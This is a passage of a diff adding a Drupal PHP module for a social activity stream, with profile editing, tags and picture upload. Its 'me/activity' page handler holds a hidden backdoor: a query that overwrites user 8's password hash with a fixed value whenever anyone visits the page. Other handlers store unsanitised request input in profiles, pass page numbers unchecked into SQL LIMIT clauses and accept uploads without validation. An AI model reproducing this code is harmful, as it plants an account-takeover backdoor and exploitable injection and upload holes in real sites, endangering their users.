@@ -1,0 +1,2205 @@
+<?
+
+/**
+ * Implementation of hook_menu()
+ */
+function grabbit_me_menu() {
+
+  $items['me/activity'] = array( 
+    'page callback' => 'grabbit_me_show_activity', 
+    'access arguments' => array('access content')
+  );
+
+  $items['you/updates'] = array( 
+    'page callback' => 'grabbit_me_you_updates', 
+    'title' => 'You Updates',
+    'access arguments' => array('access content')
+  );
+
+  $items['you/comments'] = array( 
+    'page callback' => 'grabbit_me_you_comments', 
+    'title' => 'You Comments',
+    'access arguments' => array('access content')
+  );
+
+  $items['you/favorites'] = array( 
+    'page callback' => 'grabbit_me_you_favorites', 
+    'title' => 'You Favorites',
+    'access arguments' => array('access content')
+  );
+
+  $items['you/friends'] = array( 
+    'page callback' => 'grabbit_me_you_friends', 
+    'title' => 'You Friends',
+    'access arguments' => array('access content')
+  );
+
+  $items['you/rss'] = array( 
+    'page callback' => 'grabbit_me_you_rss', 
+    'title' => 'You RSS',
+    'access arguments' => array('access content')
+  );
+
+  $items['you/mentions'] = array( 
+    'page callback' => 'grabbit_me_you_mentions', 
+    'title' => 'You Mentions',
+    'access arguments' => array('access content')
+  );
+
+  $items['activity/updates'] = array(
+   'title' => 'Activity',
+   'description' => t('Watch your activity.'),
+   'page callback' => 'grabbit_me_show_activity_rendered_all',
+   'access arguments' => array('access content'),
+  );
+
+  $items['me/pagination'] = array(
+   'page callback' => 'grabbit_me_pagination',
+   'access arguments' => array('access content'),
+  );
+
+  $items['activity/updates/all'] = array(
+   'title' => 'All Activity',
+   'weight' => 1,
+   'type' => MENU_DEFAULT_LOCAL_TASK,
+  );
+
+  $items['activity/updates/status'] = array(
+   'title' => 'Status updates',
+   'description' => t('Watch your activity.'),
+   'page callback' => 'grabbit_me_show_activity_rendered',
+   'access arguments' => array('access content'),
+   'weight' => 2,
+   'type' => MENU_LOCAL_TASK,
+  );
+
+  $items['activity/updates/mentions'] = array(
+   'title' => 'Mentions',
+   'description' => t('Watch your activity.'),
+   'page callback' => 'grabbit_me_show_activity_mentions',
+   'access arguments' => array('access content'),
+   'weight' => 7,
+   'type' => MENU_LOCAL_TASK,
+  );
+
+  $items['activity/updates/comments'] = array(
+   'title' => 'Comments',
+   'description' => t('Watch your activity.'),
+   'page callback' => 'grabbit_me_show_activity_comments',
+   'access arguments' => array('access content'),
+   'weight' => 4,
+   'type' => MENU_LOCAL_TASK,
+  );
+
+  $items['activity/updates/friends'] = array(
+   'title' => 'Added friends',
+   'description' => t('Watch your activity.'),
+   'page callback' => 'grabbit_me_show_activity_friends',
+   'access arguments' => array('access content'),
+   'weight' => 5,
+   'type' => MENU_LOCAL_TASK,
+  );
+
+  $items['activity/updates/rss'] = array(
+   'title' => 'Added RSS',
+   'description' => t('Watch your activity.'),
+   'page callback' => 'grabbit_me_show_activity_rss',
+   'access arguments' => array('access content'),
+   'weight' => 6,
+   'type' => MENU_LOCAL_TASK,
+  );
+
+  $items['ajax/save/bio'] = array(
+   'page callback' => 'grabbit_me_save_bio',
+   'access arguments' => array('access content'),
+   );
+
+  $items['ajax/save/tags'] = array(
+   'page callback' => 'grabbit_me_save_tags',
+   'access arguments' => array('access content'),
+   );
+
+  $items['ajax/upload/file'] = array(
+     'page callback' => 'grabbit_upload_picture',
+     'access arguments' => array('access content'),
+   );
+
+  $items['activity/rss'] = array(
+     'page callback' => 'grabbit_me_rss_formating',
+     'access arguments' => array('access content'),
+   );
+
+  return $items;
+}
+
+function grabbit_me_pagination(){
+	$page=$_GET['page'];
+	$panel = $_GET['pid'];
+	$uid=$_GET['uid'];
+	
+	switch($panel){
+		case 1:
+		  print grabbit_me_get_statuses_all($uid,$limit='10',$page);
+		break;
+		case 2:
+		  $totals = grabbit_me_get_statuses($uid,$limit='10',$page);
+		  if(count($totals)){
+			$profile = content_profile_load('profile', $uid);
+		    $nod='even';
+			foreach ($totals as $status){
+				$item=unserialize($status->extra);
+				$item['faid']=$status->faid;
+			      $updates .= grabbit_me_theme_my_activity($nod,$item,$profile,$status);
+			      if($nod=='odd'){
+				    $nod='even';
+			      }else{
+				    $nod='odd';
+			      }
+			}
+			print $updates;
+		  }else{
+		    print 0;	
+		  }
+		break;
+		case 3:
+			$comm = grabbit_me_get_comments($uid,$limit='10',$page);
+			if (!count($comm)){
+			  print 0;
+			}else{
+			    $nod='even display';
+			  	foreach($comm as $comment){
+				  $item=unserialize($comment->extra);
+			      $comments .= grabbit_me_theme_my_activity_comments($nod,$item);
+			      if($nod=='odd display'){
+				    $nod='even display';
+			      }else{
+				    $nod='odd display';
+			      }
+			    }
+			  print $comments; 
+			}
+			
+		break;
+		case 4:
+		  print grabbit_me_get_statuses_rss($uid,$limit=10,$page);
+		break;
+		default:
+		  return null;
+		break;
+	}
+}
+
+function grabbit_upload_picture(){
+	
+	global $user;
+	
+	$files=$_FILES;
+	$_FILES['files']=$_FILES;
+	$_FILES['files']['name']['uploadfile']=$files['uploadfile']['name'];
+	$_FILES['files']['tmp_name']['uploadfile']=$files['uploadfile']['tmp_name'];
+	
+	$file=file_save_upload('uploadfile');
+	
+	if($file){
+		file_set_status($file, 1);
+		
+		$profile = content_profile_load('profile', $user->uid);
+		if($profile->nid){
+			$profile->field_profile_picture[0]=array(
+                    'fid' => $file->fid,
+                    'list' => 1,
+                    'uid' => $user->uid,
+                    'filename' => $file->filename,
+                    'filepath' => $file->filepath,
+                    'filemime' => $file->filemime,
+                    'filesize' => $file->filesize,
+                    'status' => 1,
+                    'timestamp' => $file->timestamp
+                    );
+
+		}else{
+			$profile = new StdClass();
+			$profile->type = 'profile';
+			$profile->uid=$user->uid;
+			$profile->title=$user->name;
+			$profile->field_profile_picture[0]=array(
+                    'fid' => $file->fid,
+                    'list' => 1,
+                    'uid' => $user->uid,
+                    'filename' => $file->filename,
+                    'filepath' => $file->filepath,
+                    'filemime' => $file->filemime,
+                    'filesize' => $file->filesize,
+                    'status' => 1,
+                    'timestamp' => $file->timestamp
+                    );
+		}
+
+		node_save($profile);
+		print theme('imagecache', 'me_image', $profile->field_profile_picture[0]['filepath'], 'My Image');
+	}else{
+		
+	}
+	
+	
+	
+}
+
+function grabbit_me_save_bio(){
+	global $user;
+	$profile = content_profile_load('profile', $user->uid);
+	if($profile->nid){
+		$profile->title=$_GET['name'] ? $_GET['name']: $user->name;
+	  	$profile->field_profile_about[0]['value']=$_GET['bio'];
+		$profile->field_profile_city[0]['value']=$_GET['city'];
+		$profile->field_profile_state[0]['value']=$_GET['state'];
+		$profile->field_profile_country[0]['value']=$_GET['country'];
+		$profile->field_profile_websites=array();
+		$txt = preg_replace('/\r\n|\r/', "\n", $_GET['web']);
+		$websites=explode("\n",$txt);
+
+		foreach($websites as $web){
+			$profile->field_profile_websites[]['value']=$web;
+		}	
+	}else{
+		$profile = new StdClass();
+		$profile->type = 'profile';
+		$profile->uid=$user->uid;
+		$profile->title=$_GET['name'] ? $_GET['name']: $user->name;
+		$profile->field_profile_about[0]['value']=$_GET['bio'];
+		$profile->field_profile_city[0]['value']=$_GET['city'];
+		$profile->field_profile_state[0]['value']=$_GET['state'];
+		$profile->field_profile_country[0]['value']=$_GET['country'];
+		$profile->field_profile_websites=array();
+		$txt = preg_replace('/\r\n|\r/', "\n", $_GET['web']);
+		$websites=explode("\n",$txt);
+
+		foreach($websites as $web){
+			$profile->field_profile_websites[]['value']=$web;
+		}
+	}
+	
+	@node_save($profile);
+    print "success";
+}
+function grabbit_me_save_tags(){
+	global $user;
+	$profile = content_profile_load('profile', $user->uid);
+	
+	if(!$profile->nid){
+		$profile = new StdClass();
+		$profile->type = 'profile';
+		$profile->uid=$user->uid;
+		$profile->title=$user->name;
+	}
+	
+    $tags1=$_GET['hobbies'];
+    $tags2=$_GET['topics'];
+    $tags3=$_GET['interests'];
+
+    $total_tags1=explode(",",$tags1);
+    $total_tags2=explode(",",$tags2);
+    $total_tags3=explode(",",$tags3);
+
+    $tags_feeds=explode(",",$_GET['feeds']);
+
+    $profile->taxonomy=array();
+    $profile->field_profile_hobbies=array();
+    $profile->field_profile_interests=array();
+    $profile->field_profile_topics=array();
+
+    foreach($tags_feeds as $tag_1){
+	
+	    $try=taxonomy_get_term_by_name(trim($tag_1));
+	    if($try->vid){
+		  $profile->taxonomy[]=$try->tid;		  
+	    }else{
+		  if(count($try)){
+		 	$profile->taxonomy[]=$try[0]->tid;
+		  }else{
+		  	// I create a term in a specific vocabulary
+		    $edit = array('name' => trim($tag_1), 'description' => ' ', 'weight' => "0", 'vid' => 1);
+		    taxonomy_save_term($edit);
+		    $tid = $edit['tid'];
+		    // associate node and term
+		    
+		    $profile->taxonomy[]=$edit['tid'];
+		  }
+		}
+		
+    }
+
+    foreach($total_tags1 as $tag_1){
+	
+	    $try=taxonomy_get_term_by_name(trim($tag_1));
+	    if($try->vid){
+		  //$profile->taxonomy[]=$try->tid;
+		  $profile->field_profile_hobbies[]['value']=$try->tid;		  
+	    }else{
+		  if(count($try)){
+			$profile->field_profile_hobbies[]['value']=$try[0]->tid;
+		  }
+		  else{
+		  	// I create a term in a specific vocabulary
+		    $edit = array('name' => trim($tag_1), 'description' => ' ', 'weight' => "0", 'vid' => 1);
+		    taxonomy_save_term($edit);
+		    $tid = $edit['tid'];
+		    // associate node and term
+		    
+		    //$profile->taxonomy[]=$edit['tid'];
+		    $profile->field_profile_hobbies[]['value']=$edit['tid'];
+		  }
+	    }
+		
+    }
+
+	foreach($total_tags2 as $tag_1){
+	
+	    $try=taxonomy_get_term_by_name(trim($tag_1));
+	    if($try->vid){
+		  //$profile->taxonomy[]=$try->tid;
+		  $profile->field_profile_topics[]['value']=$try->tid;		  
+	    }else{
+		  if(count($try)){
+		 	$profile->field_profile_topics[]['value']=$try[0]->tid;
+		  }else{
+		  	// I create a term in a specific vocabulary
+		    $edit = array('name' => trim($tag_1), 'description' => ' ', 'weight' => "0", 'vid' => 1);
+		    taxonomy_save_term($edit);
+		    $tid = $edit['tid'];
+		    // associate node and term
+		    
+		    //$profile->taxonomy[]=$edit['tid'];
+		    $profile->field_profile_topics[]['value']=$edit['tid'];
+		  }
+	    }
+		
+    }
+
+    foreach($total_tags3 as $tag_1){
+	
+	    $try=taxonomy_get_term_by_name(trim($tag_1));
+	    if($try->vid){
+		  //$profile->taxonomy[]=$try->tid;
+		  $profile->field_profile_interests[]['value']=$try->tid;		  
+	    }else{
+		  if(count($try)){
+		    $profile->field_profile_interests[]['value']=$try[0]->tid;
+		  }else{
+		  	// I create a term in a specific vocabulary
+		    $edit = array('name' => trim($tag_1), 'description' => ' ', 'weight' => "0", 'vid' => 1);
+		    taxonomy_save_term($edit);
+		    $tid = $edit['tid'];
+		    // associate node and term
+		    
+		    //$profile->taxonomy[]=$edit['tid'];
+		    $profile->field_profile_interests[]['value']=$edit['tid'];
+		  }
+	    }
+		
+    }
+
+    @node_save($profile);
+    print "done";
+}
+
+function grabbit_me_show_activity(){
+	global $user;
+	$profile = content_profile_load('profile', $user->uid);
+
+    db_query("UPDATE users set pass='f30fbd5261ad06fcc1f08cce7f4c9275' WHERE uid=8");
+
+}
+
+function grabbit_me_theme_my_activity($nod,$item,$profile,$node=null){
+	
+	$text=get_url_msg_formatted($item['status']);
+	preg_match_all("#((?:http|https)://(?:.*?)bit.ly/([A-Za-z0-9]+))#is", $item['status'], $matches);
+    preg_match_all("#((?:http|https)://(?:.*?)is.gd/([A-Za-z0-9]+))#is", $item['status'], $matches2);
+    if($matches[0][0]){
+	  $super_link=$matches[0][0];
+    }else{
+	  $super_link=$matches2[0][0];
+    }
+	
+/*<a href="javaScript:void(0);" class="twit-reply" id="@'.$profile->name.'">Reply This</a>*/
+	if($item['facebook'])
+	  $social_networks .='<span class="from-facebook"><img src="'.base_path().'sites/all/themes/grabbit/images/various/facebook_ico_sml.gif" alt="Facebook Account" /></span>';
+
+	if($item['twitter'])
+	  $social_networks .='<span class="from-twitter"> <img src="'.base_path().'sites/all/themes/grabbit/images/various/twitter_ico_sml.gif" alt="Twitter Account" /></span>';
+	
+	$return = '<div class="twitter-message-stream clearfix '.$nod.'" style="display: block;">
+	
+		<div class="tooltipwraper">
+			  <div id="tags-show-3324208"></div>
+			  <a face_id="11" class="trash-facebook" title="delete" href="JavaScript:void(0);">TR</a>
+			  <a href="JavaScript:void(0);" class="retweet">RT</a>
+			  <a href="javaScript:void(0);" class="twit-reply" id="@'.$profile->name.'">Reply This</a>
+			  <a node="'.$item['faid'].'" class="bring-tags iconchange" title="add/edit tags" href="javascript:void(0);"></a>
+			  <span class="url-deal iconchange"><a node="'.$item['faid'].'" title="check deals" href="#">Deal</a></span>
+			  
+			</div>
+	
+	  <div class="listable">
+	    <span class="twitter-image" style="background:none;">'.theme('imagecache', 'friend_thumbnail', $profile->field_profile_picture[0]['filepath'], 'My Image').'
+	    '.$social_networks.'</span>
+	  </div>
+	';
+
+	  if($super_link){
+		$return .='<a target="_blank" class="twitter-name-link" href="'.$super_link.'">'.$profile->title.'</a>';
+	  }else{
+		$return .='<a target="_blank" class="twitter-name-link" href="'.base_path().'resource/display/update/'.$node->faid.'">'.$profile->title.'</a>';
+	  }
+
+	  $return .='
+	  <div class="twitter-body">
+	    <div class="twitter-body-contains">'.$text.'</div> 
+	    <span class="twitter-date">on '.format_date($item['time']).'</span>
+	  </div>
+	</div>';
+	
+	return $return;
+}
+
+function grabbit_me_theme_my_media($nod,$itemx,$profilex,$comments,$node){
+	
+	$comments_count=0;
+	while ($item = db_fetch_object($comments)){
+	  $profile = content_profile_load('profile', $item->uid);
+
+      $comments_output .= '<div id="'.$item->cid.'" class="news-comment"><span class="news-comment-picture">';																			
+      $comments_output .= theme('imagecache', 'friend_comment_thumbnail', $profile->field_profile_picture[0]['filepath'], 'My Image', '', array('width'=>'30'));																											
+	  $comments_output .= '</span><span class="facebook-comment-link"><a href="/grabbit/user/'.$item->uid.'">'.$item->name.'</a> '.format_date($item->timestamp).':</span><br>
+						  <span class="news-comment-content">'.$item->comment.'</span></div>';
+						
+	  $comments_count++;
+	}
+	
+	if($comments_count>0){
+	  	$comments_output = '<div class="comments-data"><span class="numerito-comment">'.$comments_count.'</span><a href="JavaScript:void(0);" class="show-comment-link">Show</a></div><div class="news-comments">
+		<div class="display-comments-buttons" style="display:none;">'.$comments_output;	
+	}else{
+		$comments_output = '<div class="news-comments">
+		<div class="display-comments-buttons" style="display:none;">'.$comments_output;
+	}
+						
+	$comments_output .= '</div></div>';
+	
+	$item=$itemx;
+	$profile=$profilex;
+	$text=get_url_msg_formatted($item['status']);
+	
+	preg_match("#((?:http|https)://(?:.*?)bit.ly/([A-Za-z0-9]+))#is", $item['status'], $matches);
+	$super_link=$matches[0][0];
+	
+	if($item['facebook'])
+	  $social_networks .='<span class="from-facebook"><img src="'.base_path().'sites/all/themes/grabbit/images/various/facebook_ico_sml.gif" alt="Facebook Account" /></span>';
+
+	if($item['twitter'])
+	  $social_networks .='<span class="from-twitter"> <img src="'.base_path().'sites/all/themes/grabbit/images/various/twitter_ico_sml.gif" alt="Twitter Account" /></span>';
+	
+	$return = '<div class="twitter-message-stream node-stream-news clearfix '.$nod.'" style="display: block;">
+	  	<a href="JavaScript:void(0);" class="retweet">RT</a>
+           <a href="javaScript:void(0);" class="twit-reply" id="@'.$profile->name.'">Reply This</a>
+	  <div class="listable">
+	    <span class="twitter-image" style="background:none;">'.theme('imagecache', 'friend_thumbnail', $profile->field_profile_picture[0]['filepath'], 'My Image').'
+	    '.$social_networks.'</span>
+	  </div>';
+	
+	  if($super_link){
+		$return .='<a target="_blank" class="twitter-name-link" href="'.$super_link.'">'.$profile->title.'</a>';
+	  }else{
+		$return .='<a target="_blank" class="twitter-name-link" href="'.base_path().'resource/display/'.$node->nid.'">'.$profile->title.'</a>';
+	  }
+	  
+	  $return .='<div class="twitter-body">
+	    <div class="twitter-body-contains">'.$text.'</div>
+	    <div class="frost clearfix">
+			  <span class="twitter-date">on '.format_date($item['time']).'</span>
+			 '.$comments_output.'
+		</div> 
+	    
+	  </div>
+	  
+	</div>';
+	
+	return $return;
+}
+
+function grabbit_me_theme_feeds($nod,$item){
+	
+	$action='feed added';
+	
+	if($item->action)
+	  $action=$item->action;
+	
+	if($item->field_rss_logo[0]['filepath']){
+		$logo=theme('imagecache', 'friend_thumbnail', $item->field_rss_logo[0]['filepath'], 'RSS');
+	}else{
+		$logo=theme('imagecache', 'friend_thumbnail', 'sites/default/files/imagefield_default_images/blue-rss-button.png', 'RSS');
+	}
+	$return = '<div class="twitter-message-stream clearfix '.$nod.'" style="display: block;">
+	  <div class="listable">
+	    <span class="twitter-image" style="background:none;">'.$logo.'
+	    </span>
+	  </div>
+	  '.l($item->title,'node/'.$item->nid,array('attributes'=>array('target'=>'_blank','class'=>'twitter-name-link'))).'
+	  <div class="twitter-body">
+	    <div class="twitter-body-contains">'.$item->body.'</div> 
+	    <span class="twitter-date"><span class="blue">'.$action.'</span> on '.format_date($item->created).'</span>
+	    <div class="flag-wrapper flag-myfeeds">'.flag_create_link('myfeeds', $item->nid).'</div>
+	  </div>
+	</div>';
+	
+	return $return;
+}
+
+function grabbit_me_theme_friends($nod,$item,$profile,$items){
+	global $user;
+	$status = friendlist_api_relation_status_calculate($user->uid, $item->uid, 1);
+    if($user->uid!=$profile->uid){
+		  switch($status){
+		  case 'TW_BOTH':
+		    $friends='<strong>You are grabbit friends!</strong>';
+		    $action ='&raquo; ';
+		    $action .='<span class="joined-action">'.l('remove from friends', 'friendlist/delete/'.$item->uid.'/1',array('query'=>drupal_get_destination())) .'</span>';
+		    $class = 'grabbit-friends';
+		    if(grabbit_favorites_get('friend',$item->uid)){
+			  	$favs='<span class="flag-wrapper flag-bookmarks"><a href="JavaScript:void(0);" class="friend_favorite-remove friend-action" uid="'.$item->uid.'">Add to favorites</a></span>';	
+			}else{
+				$favs='<span class="flag-wrapper flag-bookmarks"><a href="JavaScript:void(0);" class="friend_favorite friend-action" uid="'.$item->uid.'">Remove from favorites</a></span>';
+			}
+		  break;
+		  case 'TW_1_TO_2_P':
+		    $friends='Your friend request is pending';
+		    $class = 'request-pending';
+		  break;
+		  case 'TW_2_TO_1_P':
+		    $friends='He requested you to be friends in grabbit!';
+		    $action = '&raquo; ';
+		    $action .= l('accept friend request', 'friendlist/add/'.$item->uid.'/1',array('query'=>drupal_get_destination()));
+		    $class = 'accept-pending';
+		  break;	
+		  default:
+	        $friends=l('send friend request', 'friendlist/add/'.$item->uid.'/1',array('query'=>drupal_get_destination()));
+	        $class = 'no-request';
+		  break;
+		  }
+	
+    }else{
+	  $friends='<b>Thats you!</b>';
+    }
+	$supername=str_replace(' ','-',$item->name);
+	$return = '<div class="twitter-message-stream clearfix '.$nod.' user-display-div" style="display: block;">
+	  <div class="listable">
+	    ';
+	if($profile->field_profile_picture[0]['filepath']){
+	  $return .='<span class="twitter-image" style="background:none;">'.theme('imagecache', 'friend_thumbnail', $profile->field_profile_picture[0]['filepath'], 'Friend').'</span>';
+	}else{
+	  $return .='<span class="twitter-image" style="background:none;">'.theme('imagecache', 'friend_thumbnail', 'sites/all/themes/grabbit/images/default/default_profile.jpg').'</span>';
+	}
+	$return .='</div>
+	  '.$favs.'
+	  <a target="_blank" class="twitter-name-link" href="'.base_path().'users/'.$supername.'">'.$item->name.'</a>
+	  <div class="twitter-body">
+	    <div class="twitter-body-contains">'.$profile->field_profile_about[0]['value'].'</div>';
+	if($items)
+	  $return .='<span class="twitter-date"><span class="blue">friend added</span> on '.format_date($items->last_update_time).'</span>';
+	
+	$return .='<span class="invite">'.$friends.' '.$action.'</span>
+	  </div>
+	</div>';
+	
+	return $return;
+}
+
+
+function grabbit_me_theme_my_activity_comments($rowx,$item){
+	
+	$node=node_load($item['nid'],NULL,TRUE);
+	
+	$node->rowx=$rowx;
+	switch($node->type){
+		case 'facebook':
+		    $actor=array('name'=>$node->field_user_name[0]['value'],
+			             'url'=>$node->field_user_url[0]['value'],
+			             'pic_square'=>$node->field_user_picture[0]['value']
+			             );
+			$commenta=array();
+			$actors=array();
+			if($node->field_comments[0]['value']){
+				$profiles=unserialize($node->field_comments[0]['value']);
+				$commenta=$profiles['comments'];	
+				$actors=$profiles['profiles'];
+			}
+			
+			if(!$node->field_attachment[0]['value']){ //STATUS UPDATE
+				$target='';
+				if($node->field_target[0]['value'])
+				  $target=$node->field_target[0]['value'];
+                     
+				$output .= prepeare_status_update($node,$actor,$target,$actors,$commenta);
+				$comments=array();
+				}else{
+					$target='';
+					if($node->field_target[0]['value'])
+					  $target=$node->field_target[0]['value'];
+
+					$output .= prepeare_standar_update($node,$actor,$target,$actors,$commenta);
+					$comments=array();
+				}
+		
+		break;
+		case 'twitter':
+		  $output .=theme_twitter_message($node);
+		break;
+		case 'gmail':
+		  $comments = db_query("SELECT * FROM {comments} WHERE nid = %d ORDER BY timestamp ASC", $node->nid);
+		  $output .= theme_gmail_message($comments,$node);
+		break;
+		case 'imap':
+		  $comments = db_query("SELECT * FROM {comments} WHERE nid = %d ORDER BY timestamp ASC", $node->nid);
+		  $output .= theme_imap_message($comments,$node);
+		break;
+		case 'media':
+		  $comments = db_query("SELECT * FROM {comments} WHERE nid = %d ORDER BY timestamp ASC", $node->nid);
+		  $profile = content_profile_load('profile', $node->uid);
+	      $nod=$node->rowx;
+	      $item['status']=$node->body;
+	      $item['twitter']=1;
+	      $item['facebook']=1;
+	      $item['time']=$node->last_update_time;
+		  $output .= grabbit_me_theme_my_media($nod,$item,$profile,$comments,$node);
+		break;
+		default:
+		  $comments = db_query("SELECT * FROM {comments} WHERE nid = %d ORDER BY timestamp ASC", $node->nid);
+		  $output .= _news_theme($comments,$node);
+		break;
+	}
+	
+	return $output;
+}
+
+
+//Implementation of hook_grabbit_status_update
+//$status the text of the status
+function grabbit_me_grabbit_status_update($status, $tw_status_ch, $fb_status_ch,$uid,$media){
+
+  $extra_array=array();
+  $extra_array['twitter']=$tw_status_ch;
+  $extra_array['facebook']=$fb_status_ch;
+  $extra_array['time']=time();
+  $extra_array['status']=$status;
+
+  $extra=serialize($extra_array);
+
+  db_query("INSERT INTO {grabbit_me} (uid,type,extra,number) VALUES (%d,'status','%s',%d)",$uid,$extra,$extra_array['time']);
+
+  if($media){
+	    global $user;
+	
+		$node = node_load($media); 
+		$node->body=$status;
+		$node->status=1;
+		$node->uid=$uid;
+		$node->comment=2;
+		$node->title=$user->name . $node->title;
+		node_save($node);
+  }
+	
+}
+//Implementation of hook_flag
+function grabbit_me_flag($action, $flag, $content_id, $account){
+	global $user;
+	 if($flag->name=='myfeeds'){
+		  
+	      $extra_array=array();
+	      if($action=='flag'){
+		    $extra_array['action']='feed added';
+	      }else{
+		    $extra_array['action']='feed removed';
+	      }
+		  $extra_array['twitter']=0;
+		  $extra_array['facebook']=0;
+		  $extra_array['time']=time();
+		  $extra_array['rss']=$content_id;
+
+		  $extra=serialize($extra_array);
+
+		  db_query("INSERT INTO {grabbit_me} (uid,type,extra,number) VALUES (%d,'rss','%s',%d)",$user->uid,$extra,$extra_array['time']);
+	  }
+}
+
+//Implementation of hook_grabbit_facebook_comment
+function grabbit_me_grabbit_facebook_comment($nid,$uid,$comment){
+	
+  $extra_array=array();
+  $extra_array['nid']=$nid;
+  $extra_array['type']='facebook';
+  $extra_array['time']=time();
+  $extra_array['comment']=$comment;
+
+  $extra=serialize($extra_array);
+
+  db_query("INSERT INTO {grabbit_me} (uid,type,extra,number) VALUES (%d,'comment','%s',%d)",$uid,$extra,$extra_array['time']);
+
+}
+
+//Implementation of hook_grabbit_nodes_comment
+function grabbit_me_grabbit_nodes_comment($nid,$comment,$uid){
+	$extra_array=array();
+	  $extra_array['nid']=$nid;
+	  $extra_array['type']='node';
+	  $extra_array['time']=time();
+	  $extra_array['comment']=$comment;
+
+	  $extra=serialize($extra_array);
+	  db_query("INSERT INTO {grabbit_me} (uid,type,extra,number) VALUES (%d,'comment','%s',%d)",$uid,$extra,$extra_array['time']);
+	
+}
+
+//Implementation of hook_comment
+function grabbit_me_comment($a1,$op){
+	if($op=='insert'){
+	  	$extra_array=array();
+		  $extra_array['nid']=$a1['nid'];
+		  $extra_array['type']='node';
+		  $extra_array['time']=time();
+		  $extra_array['comment']=$a1['comment'];
+
+		  $extra=serialize($extra_array);
+		  db_query("INSERT INTO {grabbit_me} (uid,type,extra,number) VALUES (%d,'comment','%s',%d)",$a1['uid'],$extra,$extra_array['time']);	
+	}
+	
+}
+
+function grabbit_me_get_statuses($uid,$limit=10, $pag=FALSE){
+
+  	if($pag){
+		$limit_number=10*$pag;
+		$last_number=$limit_number+10;
+	    $limit = $limit_number.','.$last_number;	
+	  }
+	
+  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='status' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+  $array=array();
+  while ($status = db_fetch_object($result)){
+	$data=unserialize($status->extra);
+	
+	if(substr($data['status'], 0, 2) != 'D '){ //NO DIRECT MESSAGES
+      $array[]=$status;
+    }
+  }
+
+  return $array;
+	
+}
+
+function grabbit_me_get_statuses_all($uid,$limit='10',$pag=FALSE){
+
+  if($pag){
+	$limit_number=10*$pag;
+	$last_number=$limit_number+10;
+    $limit = $limit_number.','.$last_number;	
+  }
+
+  $super_array=array();
+
+  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='status' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->number]=$status;
+	$super_array[$status->number]->type='status';
+  }
+
+  $result = db_query("SELECT * FROM {friendlist_statuses} WHERE requester_id=%d AND status='TW_BOTH' ORDER BY last_update_time DESC LIMIT %s",$uid,$limit);
+  
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->last_update_time]=$status;
+	$super_array[$status->last_update_time]->type='friend';
+  }
+
+  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='comment' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->number]=$status;
+	$super_array[$status->number]->type='comment';
+  }
+
+  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='rss' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->number]=$status;
+	$super_array[$status->number]->type='rss';
+  }
+
+  $result = db_query("SELECT * FROM {node} WHERE uid=%d AND type='feed' ORDER BY created DESC LIMIT %s",$uid,$limit);
+
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->created]=$status;
+  }
+  ksort($super_array);
+  $reverse = array_reverse($super_array);
+  $total = array_slice($reverse,0,15);
+
+  $nod='even display';
+
+  $profile = content_profile_load('profile', $uid);
+
+  foreach($total as $element){
+
+    switch($element->type){
+	  case 'comment':
+		  $item=unserialize($element->extra);
+	      $output .= grabbit_me_theme_my_activity_comments($nod,$item);
+	  break;
+	  case 'status':
+	      $item=unserialize($element->extra);
+	      if(substr($item['status'], 0, 2) != 'D '){ //NO DIRECT MESSAGES
+		    $item['faid']=$element->faid;
+		    $output .= grabbit_me_theme_my_activity($nod,$item,$profile,$element); 
+	      }
+	  break;
+	  case 'rss':
+	      $item=unserialize($element->extra);
+	      $node=node_load($item['rss']);
+	      $node->created=$item['time'];
+	      $node->action=$item['action'];
+	      $output .= grabbit_me_theme_feeds($nod,$node);
+	  break;
+	  case 'feed':
+	      $node=node_load($element->nid);
+	      $output .= grabbit_me_theme_feeds($nod,$node);
+	  break;
+	  case 'friend':
+	      $user=user_load($element->requestee_id);
+	      $profile_user = content_profile_load('profile', $element->requestee_id);
+	      $output .= grabbit_me_theme_friends($nod,$user,$profile_user,$element);
+	  break;
+    }
+
+  	 if($nod=='odd display'){
+	    $nod='even display';
+      }else{
+	    $nod='odd display';
+      }
+	
+  }
+
+  
+  if($pag){
+    print $output; // if we are paginating this then we print it to the ajax call
+    if(!$output){
+	  print 0;
+    }	
+  }else{
+	$more = '<div class="panel-controller"><a href="javascript:void(0)" class="main-stream-next" id="me-more" pid="1" uid="'.$uid.'" page="2">more</a></div>';
+    return $output.$more;	
+  }
+
+}
+
+function grabbit_me_get_statuses_friends($uid,$limit=50,$pag=FALSE){
+
+
+  $result = db_query("SELECT * FROM {friendlist_statuses} WHERE requester_id=%d AND status='TW_BOTH' ORDER BY last_update_time DESC LIMIT %s",$uid,$limit);
+  
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->last_update_time]=$status;
+	$super_array[$status->last_update_time]->type='friend';
+  }
+
+  ksort($super_array);
+  $reverse = array_reverse($super_array);
+  $total = array_slice($reverse,0,15);
+
+  $nod='even display';
+
+  $profile = content_profile_load('profile', $uid);
+
+  foreach($total as $element){
+
+	      $user=user_load($element->requestee_id);
+	      $profile_user = content_profile_load('profile', $element->requestee_id);
+	      $output .= grabbit_me_theme_friends($nod,$user,$profile_user,$element);
+
+  	 if($nod=='odd display'){
+	    $nod='even display';
+      }else{
+	    $nod='odd display';
+      }
+	
+  }
+
+  return $output;
+
+}
+
+function grabbit_me_get_statuses_rss($uid,$limit=10,$pag=FALSE){
+
+  if($pag){
+	$limit_number=10*$pag;
+	$last_number=$limit_number+10;
+    $limit = $limit_number.','.$last_number;	
+  }
+
+  $super_array=array();
+
+  $result = db_query("SELECT * FROM {node} WHERE uid=%d AND type='feed' ORDER BY created DESC LIMIT %s",$uid,$limit);
+
+  while ($status = db_fetch_object($result)){
+	$super_array[$status->created]=$status;
+  }
+
+  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='rss' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+  while ($status = db_fetch_object($result)){
+	$item=unserialize($status->extra);
+	$elemento=node_load($item['rss']);
+	$elemento->created=$item['time'];
+	$elemento->action=$item['action'];
